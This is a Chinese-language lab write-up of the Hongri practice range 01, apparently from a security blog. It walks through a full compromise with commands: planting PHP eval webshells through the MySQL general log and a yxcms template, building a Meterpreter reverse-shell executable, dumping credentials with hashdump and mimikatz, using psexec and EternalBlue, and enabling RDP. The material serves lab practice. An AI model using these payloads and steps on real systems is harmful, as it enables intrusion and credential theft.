    <entry>
      <title>红日靶场01</title>
      <link href="/2023/05/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/"/>
      <url>/2023/05/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><p>靶场下载地址：<br> <a href="https://pan.baidu.com/s/1nC6V8e_EuKfaLb2IuEbe7w&shfl=sharepset">https://pan.baidu.com/s/1nC6V8e_EuKfaLb2IuEbe7w&amp;shfl=sharepset</a> 提取码：n1u2</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  192.168.1.103</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/1.png"></p><h2 id="web路径发现"><a href="#web路径发现" class="headerlink" title="web路径发现"></a>web路径发现</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python  dirsearch.py -u <span class="string">&quot;http://192.168.1.103/&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/2.png"></p><h2 id="phpmyadmin渗透"><a href="#phpmyadmin渗透" class="headerlink" title="phpmyadmin渗透"></a>phpmyadmin渗透</h2><p>访问其80端口，出现phpstudy探针页面，这里记下页面绝对路径<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/3.png"><br>尝试使用弱口令root&#x2F;root进行mysql连接检查，发现可以连接mysql<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/4.png"><br>访问其phpmyadmin页面，使用root&#x2F;root进行登录，登录成功<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/5.png"></p><h3 id="日志导出getshell"><a href="#日志导出getshell" class="headerlink" title="日志导出getshell"></a>日志导出getshell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show variables like<span class="string">&#x27;general%&#x27;</span>;                           <span class="comment">#查看通用查询日志是否开启</span></span><br><span class="line"><span class="built_in">set</span> global general_log=on;                               <span class="comment">#开启通用日志查询：</span></span><br><span class="line"><span class="built_in">set</span> global general_log_file=<span class="string">&quot;C:/phpStudy/WWW/404.php&quot;</span>     <span class="comment">#设置日志文件保存位置</span></span><br></pre></td></tr></table></figure><p>运行以上三句sql语句，成功设置日志文件的保存位置，写入phpinfo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT  <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/6.png"><br>访问404.php页面，解析成功<br>使用sql模块上传一句话木马,使用蚁剑进行连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>  <span class="string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;])?&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/7.png"><br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/8.png"></p><h2 id="yxcms渗透"><a href="#yxcms渗透" class="headerlink" title="yxcms渗透"></a>yxcms渗透</h2><p>通过发现后台存在yxcms路径，访问其路径，打开一个yxcms网站<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/9.png"><br>在公告信息处提示后台路径和用户密码，成功进入后台<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/10.png"><br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/11.png"></p><h3 id="编辑模版getshell"><a href="#编辑模版getshell" class="headerlink" title="编辑模版getshell"></a>编辑模版getshell</h3><p>选择”前台模版“——&gt;”管理模版文件“，在里面的文件中编辑木马<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/12.png"><br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/13.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);</span><br><span class="line"><span class="built_in">return</span> array (</span><br><span class="line">  <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;最新默认模板2013-2-1&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;author&#x27;</span> =&gt; <span class="string">&#x27;yx&#x27;</span>,</span><br><span class="line">); ?&gt; </span><br></pre></td></tr></table></figure><p>保存内容后，通过百度Yxcmszapp1.2.1可以找到其路径：<br><a href="http://192.168.1.143/yxcms/protected/apps/default/view/default/info.php">http://192.168.1.143/yxcms/protected/apps/default/view/default/info.php</a><br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/14.png"><br>通过蚁剑连接：<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/15.png"><br>连接成功 </p><h2 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h2><p>打开msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfdb  run                                  <span class="comment">#自动启用连接数据库</span></span><br></pre></td></tr></table></figure><p>使用模块生成payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use  windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span>  LHOST 192.168.52.128</span><br><span class="line"><span class="built_in">set</span>  LPORT 5555</span><br><span class="line">generate  -f exe -o 64.exe</span><br><span class="line">(或者使用：msfvenom  -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.52.128 LPORT=5555 -f exe  -o shell.exe)</span><br></pre></td></tr></table></figure><p>监听模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use  exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span>  LHOST 192.168.52.128</span><br><span class="line"><span class="built_in">set</span>  LPORT 5555</span><br><span class="line"><span class="built_in">set</span>  payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">exploit                              <span class="comment">#自动启用连接数据库</span></span><br></pre></td></tr></table></figure><p>将生成的64.exe上传webshell，在命令行启动.\64.exe<br>msf监听成功，返回shell </p><h2 id="msf渗透利用"><a href="#msf渗透利用" class="headerlink" title="msf渗透利用"></a>msf渗透利用</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid                                   <span class="comment">#用于获得运行meterpreter会话的用户名</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/16.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net  config workstation             <span class="comment">#查询当前登录域及登录用户信息   </span></span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/17.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time  /domain                     <span class="comment">#确定域控主机名及ip </span></span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/18.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net  view     <span class="comment">#查看当前的网络计算机列表 </span></span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/19.png"><br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/20.png"></p><h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><p>利用hashdump获取hash密码，破解密码即可获得登录密码<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/21.png"></p><h3 id="kiwi"><a href="#kiwi" class="headerlink" title="kiwi"></a>kiwi</h3><p>kiwi模块：<br>  mimikatz模块已经合并为kiwi模块；使用kiwi模块需要system权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/22.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">creds_all                  <span class="comment">#该命令可以列举系统中的明文密码</span></span><br><span class="line">creds_kerberos             <span class="comment">#列举所有kerberos凭据</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/23.png"></p><p>提权到system的两种方法：<br>一是当前的权限是administrator用户；<br>二是利用其它手段先提权到administrator用户。然后administrator用户可以直接在meterpreter_shell中使用命令getsystem提权到system权限<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/24.png"><br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/25.png"><br>查看administrator是否是域管理员<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/26.png"></p><h2 id="MSF进程迁移（偷令牌）"><a href="#MSF进程迁移（偷令牌）" class="headerlink" title="MSF进程迁移（偷令牌）"></a>MSF进程迁移（偷令牌）</h2><p>  通过msf得到的会话容易被发现，导致后渗透失败。因此我们可以把shell的进程迁移绑定到目标机正常的进程中<br>首先反弹一个shell，在meterpreter中执行ps命令查看目标机器的进程，x64.exe是我用msf生成的payload，在目标机器中的任务管理器中也可以查看到该进程。<br>migrate命令<br>migrate的参数可以是pid也可以是进程的名称<br>我们将进程迁移到httpd.exe（任务管理器）中可以执行<br><strong>migrate 2208</strong>或<strong>migrate-P 2208</strong>（pid根据实际情况而定）<br>还可以执行<strong>migrate -N httpd.exe</strong><br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/27.png"><br>通过getuid查看当前用户：<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/28.png"><br>是否能查看其他用户，当前用户就是域管理员用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span>  \\owa\C$</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/29.png"><br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/30.png"><br>那么这需要这两台用户上线，使用psexec模块 </p><h2 id="msf-psexec模块利用"><a href="#msf-psexec模块利用" class="headerlink" title="msf psexec模块利用"></a>msf psexec模块利用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search  psexec</span><br><span class="line">use 4</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/31.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>  RHOSTS 192.168.52.138</span><br><span class="line"><span class="built_in">set</span>  SMBDomain GOD.ORG</span><br><span class="line"><span class="built_in">set</span>  SMBPass hongrisec@2023</span><br><span class="line"><span class="built_in">set</span>  SMBUSER Administrator</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/32.png"><br>设置路由</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run  post/multi/manage/autoroute</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/33.png"><br>打不通，使用frp开socks<br>msf中上传frpc.exe和frpc.ini,注意上传之前要修改frpc.ini的地址，<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/34.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./frps  -c ./frps.ini <span class="comment">#开启frps</span></span><br><span class="line">.\frpc.exe  -c .\frpc.ini <span class="comment">#连接frp</span></span><br></pre></td></tr></table></figure><p>成功建立隧道，直接Ctrl+C，隧道不会断开<br>执行exploit发现还是不行</p><h2 id="Fscan"><a href="#Fscan" class="headerlink" title="Fscan"></a>Fscan</h2><p>上传fscan<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/35.png"><br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/36.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fscan64  -h 192.168.52.0/24</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/37.png"><br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/38.png"></p><h2 id="ms17-010-eternalblue模块利用"><a href="#ms17-010-eternalblue模块利用" class="headerlink" title="ms17_010_eternalblue模块利用"></a>ms17_010_eternalblue模块利用</h2><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/39.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>  RHOSTS 192.168.52.138</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/40.png"></p><h2 id="ms17-010-command模块利用"><a href="#ms17-010-command模块利用" class="headerlink" title="ms17_010_command模块利用"></a>ms17_010_command模块利用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search  ms17-010</span><br><span class="line">use 2</span><br><span class="line"><span class="built_in">set</span>  RHOSTS 192.168.52.141</span><br><span class="line"><span class="comment">#开启3389远程：</span></span><br><span class="line"><span class="built_in">set</span>  COMMAND <span class="string">&#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot;  &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/41.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains  rdesktop 192.168.52.141 -p hongrisec@2022 -u administrator </span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/42.png"><br>成功连接：<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/43.png"></p><h2 id="使用CobaltStrike速通"><a href="#使用CobaltStrike速通" class="headerlink" title="使用CobaltStrike速通"></a>使用CobaltStrike速通</h2><p>CS生成exe木马<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/44.png"><br>上传至webshell，启动.\a.exe<br>成功上线<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/45.png"><br>使用psexec使主机上线<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/46.png"><br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/47.png"><br>点击“开始”<br><img src="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/48.png"><br>138成功上线</p>]]></content>
      
      
